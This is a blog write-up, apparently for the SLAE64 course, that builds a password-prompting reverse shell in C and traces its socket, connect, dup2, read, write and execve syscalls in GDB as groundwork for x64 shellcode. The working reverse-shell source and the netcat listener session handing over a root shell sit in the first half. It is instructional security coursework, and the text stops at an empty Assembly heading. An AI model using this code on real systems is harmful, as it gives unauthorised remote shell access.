---
title: SLAE64 Assignment 2 - Password Protected Reverse Shell
date: 2020-4-06
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Reverse
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)


# C Reverse Shell 
I first created a skelton reverse shell using the C language to reverse engineer the work needed to be done for the assembly shellcode version.

## revshell.c
```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */
#include <stdlib.h>
int main(void)
{
	int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	struct sockaddr_in ipSocketAddr = { 
        .sin_family = AF_INET, 
        .sin_port = htons(4444), 
        .sin_addr.s_addr = inet_addr("127.1.1.1") 
    };
	connect(ipv4Socket, (struct sockaddr*)&ipSocketAddr, sizeof(ipSocketAddr)); 
	dup2(ipv4Socket, 0); // Standard Input
	dup2(ipv4Socket, 1); // Standard Output
	dup2(ipv4Socket, 2); // Standard Error
    write(ipv4Socket, "Mothers Maiden Name?", 20); 
    char buff[4];
    read(ipv4Socket, buff, 4);
	execve("/bin/bash", NULL, NULL);
}	
```
+ Password checking will be done in assembly and is not included in the C skeleton program.

## Compiling & Testing
```bash
root# gcc revshell.c -o revshell
root# ./revshell 
────────────────────────────────────────────────────────────
root# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 44006
Mothers Maiden Name?1337
id
uid=0(root) gid=0(root) groups=0(root),46(plugdev)
```

## C Reverse Shell GDB Analysis
```bash
root# gdb ./revshell
db-peda$ info functions
0x0000000000001030  write@plt
0x0000000000001040  htons@plt
0x0000000000001050  dup2@plt
0x0000000000001060  read@plt
0x0000000000001070  execve@plt
0x0000000000001080  inet_addr@plt
0x0000000000001090  connect@plt
0x00000000000010a0  socket@plt
gdb-peda$ b socket
Breakpoint 1 at 0x10a0
gdb-peda$ r
```

### 1 - Socket
```bash
[----------------------code----------------------]
=> 0x7ffff7edf8d0 <socket>:     mov    eax,0x29
   0x7ffff7edf8d5 <socket+5>:   syscall
[-------- Registers at time System Call ---------]
RAX: 0x29
RDI: 0x2 
RSI: 0x1 
RDX: 0x0 
```

### 2 - Connect
```bash
[-------- Registers at time System Call ---------]
RAX: 0x2a
RDI: 0x3 <- Socket FD returned from socket()
RSI: 0x7fffffffe120 --> 0x101017f5c110002
  gdb-peda$ hexdump $rsi 16
  0x00007fffffffe120 : 
    02 00 11 5c 7f 01 01 01 00 00 00 00 00 00 00 00
  AF_INET|4444 |127.1. 1. 1 [----Leave as Nulls----]
RDX: 0x10 <- Struct Size (16 bytes)
```

### 3 - Dup2
```bash
[----------------------code----------------------]
=> 0x7ffff7ed0020 <dup2>:       mov    eax,0x21
   0x7ffff7ed0025 <dup2+5>:     syscall 
[-------- Registers at time System Call ---------]
RAX: 0x21
RDI:  0x3 <- Socket FD returned from socket()
RSI: 0x0, 0x1, 0x2
```

### 4 - Write
```bash
[-------- Registers at time System Call ---------]
RAX: 0x1
RDI: 0x3 <- Socket FD returned from socket()
RSI: 0x55555555600e ("Mothers Maiden Name?")
RDX: 0x14 <- Size of String (20 bytes)
```

### 5 - Read
```bash
[-------- Registers at time System Call ---------]
RAX: 0x0
RDI: 0x3 <- Socket FD returned from socket()
RSI: &Destination
RDX: 0x4 <- Size of String to read
```

### 6 - Execve
```bash
[----------------------code----------------------]
=> 0x7ffff7eabe80 <execve>:     mov    eax,0x3b
   0x7ffff7eabe85 <execve+5>:   syscall 
[-------- Registers at time System Call ---------]
RAX: 0x3b
RDI: 0x555555556023 ("/bin/bash")
  gdb-peda$ hexdump $rdi
  0x0000555555556023 : 2f 62 69 6e 2f 62 61 73 68 00  /bin/bash.
RSI: 0x0
RDX: 0x0
```

### Sys Calls
```bash
root# cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | \
egrep "(connect|execve |write |read |socket |dup2)"
#define __NR_read 0       => \x00
#define __NR_write 1      => \x01
#define __NR_dup2 33      => \x21
#define __NR_socket 41    => \x29
#define __NR_connect 42   => \x2a
#define __NR_execve 59    => \x3b
```


# Assembly
